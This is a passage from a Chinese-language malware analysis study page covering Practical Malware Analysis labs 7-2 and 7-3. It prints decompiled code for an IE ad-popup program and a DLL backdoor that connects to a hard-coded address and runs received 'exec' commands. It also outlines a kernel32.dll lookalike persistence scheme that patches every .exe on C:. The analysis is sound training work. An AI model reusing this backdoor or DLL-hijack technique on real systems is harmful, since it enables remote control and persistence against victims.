+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">VariantInit</span>(<span style="color:#f92672">&amp;</span>pvarg);
+</span></span><span style="display:flex;"><span>      v7[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>      v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">SysAllocString</span>(psz);
+</span></span><span style="display:flex;"><span>      (<span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>ppv <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2C</span>))(ppv, v3, v7, <span style="color:#f92672">&amp;</span>pvarg, <span style="color:#f92672">&amp;</span>pvarg, <span style="color:#f92672">&amp;</span>pvarg);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">SysFreeString</span>(v3);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">OleUninitialize</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>这个<code>COM</code>组件有一个规定就是，如果程序想要使用COM组件那么在程序开头必须调用一个或以上的<code>OleInitialize</code>或者<code>CoInitializeEx</code>让<code>COM</code>初始化，而<code>CoCreateInstance</code>为创建一个<code>COM</code>组件，其中<code>rclsid</code>为<code>Internet Explorer</code>，<code>riid</code>为<code>IWebBrowser2</code>。或许是无法识别的原因，这个<code>*ppv + 0x2C</code>，也就是<code>[edx+2Ch]</code>这个地址其实是<code>Navigate</code>函数，这个函数就可以使程序启动<code>Internet Explorer</code>，第二个参数（v3）就是弹出浏览器的地址（<code>http://www.malwareanalysisbook.com/ad.html</code>）。</p>
+<h3>Lab 7-3<span class="hx-absolute -hx-mt-20" id="lab-7-3"></span>
+    <a href="#lab-7-3" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>DLL：</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">DllMain</span>(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  SOCKET v3; <span style="color:#75715e">// esi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  HANDLE hObject; <span style="color:#75715e">// [esp+10h] [ebp-11F8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> sockaddr name; <span style="color:#75715e">// [esp+14h] [ebp-11F4h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> _PROCESS_INFORMATION ProcessInformation; <span style="color:#75715e">// [esp+24h] [ebp-11E4h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> _STARTUPINFOA StartupInfo; <span style="color:#75715e">// [esp+34h] [ebp-11D4h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">struct</span> WSAData WSAData; <span style="color:#75715e">// [esp+78h] [ebp-1190h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">4093</span>]; <span style="color:#75715e">// [esp+208h] [ebp-1000h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">__int16</span> v11; <span style="color:#75715e">// [esp+1205h] [ebp-3h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v12; <span style="color:#75715e">// [esp+1207h] [ebp-1h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fdwReason <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> byte_10026054;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">1</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0xFFCu</span>);		<span style="color:#75715e">//初始化
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    v11 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    v12 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">OpenMutexA</span>(<span style="color:#ae81ff">0x1F0001u</span>, <span style="color:#ae81ff">0</span>, Name) )	<span style="color:#75715e">//打开互斥体，如果没有就创建一个
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CreateMutexA</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, Name);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">WSAStartup</span>(<span style="color:#ae81ff">0x202u</span>, <span style="color:#f92672">&amp;</span>WSAData) )	<span style="color:#75715e">//初始化winsock库
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      {
+</span></span><span style="display:flex;"><span>        v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>);	<span style="color:#75715e">//创建tcp通信
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ( v3 <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          name.sa_family <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*&amp;</span>name.sa_data[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">inet_addr</span>(cp);
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>name.sa_data <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(<span style="color:#ae81ff">0x50u</span>);
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">connect</span>(v3, <span style="color:#f92672">&amp;</span>name, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>              {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">send</span>(v3, <span style="color:#f92672">::</span>buf, <span style="color:#a6e22e">strlen</span>(<span style="color:#f92672">::</span>buf), <span style="color:#ae81ff">0</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">shutdown</span>(v3, <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )	<span style="color:#75715e">//这个send发送了hello
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">goto</span> LABEL_15;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">while</span> ( <span style="color:#a6e22e">recv</span>(v3, buf, <span style="color:#ae81ff">4096</span>, <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> );	<span style="color:#75715e">//如果接收到sleep就睡觉60秒，如果接收到exec就接收第五个之后的值进行启动进程。
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strncmp</span>(expect_sleep, buf, <span style="color:#ae81ff">5u</span>) )
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>LABEL_10:
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">Sleep</span>(<span style="color:#ae81ff">0x60000u</span>);
+</span></span><span style="display:flex;"><span>              }
+</span></span><span style="display:flex;"><span>              <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">strncmp</span>(expect_exec, buf, <span style="color:#ae81ff">4u</span>) )
+</span></span><span style="display:flex;"><span>              {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ( buf[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;q&#39;</span> )
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                  <span style="color:#a6e22e">CloseHandle</span>(hObject);
+</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">goto</span> LABEL_10;
+</span></span><span style="display:flex;"><span>              }
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>StartupInfo, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(StartupInfo));
+</span></span><span style="display:flex;"><span>              StartupInfo.cb <span style="color:#f92672">=</span> <span style="color:#ae81ff">68</span>;
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">CreateProcessA</span>(<span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">5</span>], <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x8000000u</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>StartupInfo, <span style="color:#f92672">&amp;</span>ProcessInformation);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>LABEL_15:
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">closesocket</span>(v3);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">WSACleanup</span>();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>EXE：</p>
+<p>大致流程为</p>
+<ol>
+<li>程序在system32目录下创建kerne132.dll文件</li>
+<li>创建Lab07-03.dll文件在当前目录下，通过一系列操作，将Lab07-03.dll文件写入特定内容，可以使kerne132.dll的导出表与kernel32.dll的导出表相同，并且当调用kerne132.dll中的api时转发到kernel32.dll中调用函数</li>
+<li>将Lab07-03.dll复制到system32目录下的kerne132.dll文件中</li>
+<li>遍历C目录下的所有.exe文件，将其中的kernel32.dll改为kerne132.dll</li>
+</ol>
+
+        </div>
+        <div class="hx-mt-16"></div>
+        <div class="hx-mb-8 hx-flex hx-items-center hx-border-t hx-pt-8 dark:hx-border-neutral-800 contrast-more:hx-border-neutral-400 dark:contrast-more:hx-border-neutral-400 print:hx-hidden"><a
+        href="/docs/remaining/itemlearn/"
+        title="ItemLearn"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-pr-4 rtl:hx-pl-4"
+      ><svg class="hx-inline hx-h-5 hx-shrink-0 ltr:hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>ItemLearn</a><a
+        href="/docs/remaining/obfu/"
+        title="Obfu"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-ml-auto ltr:hx-pl-4 ltr:hx-text-right rtl:hx-mr-auto rtl:hx-pr-4 rtl:hx-text-left"
+      >Obfu<svg class="hx-inline hx-h-5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div>
+        
+      </main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx-bg-gray-100 hx-pb-[env(safe-area-inset-bottom)] dark:hx-bg-neutral-900 print:hx-bg-transparent"><div
+      class="hextra-custom-footer hx-max-w-screen-xl hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400"
+    ></div><div
+        class="hx-max-w-screen-xl hx-mx-auto hx-flex hx-justify-center hx-py-12 hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400 md:hx-justify-start"
+      >
+        <div class="hx-flex hx-w-full hx-flex-col hx-items-center sm:hx-items-start"><div class="hx-font-semibold"><a class="hx-flex hx-text-sm hx-items-center hx-gap-1 hx-text-current" target="_blank" rel="noopener noreferrer" title="Hextra GitHub Homepage" href="https://github.com/imfing/hextra">
+    <span>Powered by Hextra<svg height=1em class="hx-inline-block ltr:hx-ml-1 rtl:hx-mr-1 hx-align-[-2.5px]" viewBox="0 0 180 180" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="m 105.50024,22.224647 c -9.59169,-5.537563 -21.40871,-5.537563 -31.000093,0 L 39.054693,42.689119 C 29.463353,48.226675 23.55484,58.460531 23.55484,69.535642 v 40.928918 c 0,11.07542 5.908513,21.3092 15.499853,26.84652 l 35.445453,20.46446 c 9.591313,5.53732 21.408404,5.53732 31.000094,0 l 35.44507,-20.46446 c 9.59131,-5.53732 15.49985,-15.7711 15.49985,-26.84652 V 69.535642 c 0,-11.075111 -5.90854,-21.308967 -15.49985,-26.846523 z M 34.112797,85.737639 c -1.384445,2.397827 -1.384445,5.352099 0,7.749927 l 24.781554,42.922974 c 1.38437,2.39783 3.942853,3.87496 6.711592,3.87496 h 49.563107 c 2.76905,0 5.3273,-1.47713 6.71144,-3.87496 l 24.78194,-42.922974 c 1.38414,-2.397828 1.38414,-5.3521 0,-7.749927 L 121.88049,42.814746 c -1.38414,-2.397828 -3.94239,-3.874964 -6.71144,-3.874964 H 65.605944 c -2.768739,0 -5.327223,1.477059 -6.711592,3.874964 z" style="stroke-width:0.774993" /></svg></span>
+  </a></div></div>
+      </div></footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+<script defer src="/lib/flexsearch/flexsearch.bundle.min.0425860527cc9968f9f049421c7a56b39327d475e2e3a8f550416be3a9134327.js" integrity="sha256-BCWGBSfMmWj58ElCHHpWs5Mn1HXi46j1UEFr46kTQyc="></script>
+    <script defer src="/en.search.js" integrity=""></script>
+  </body>
+</html>
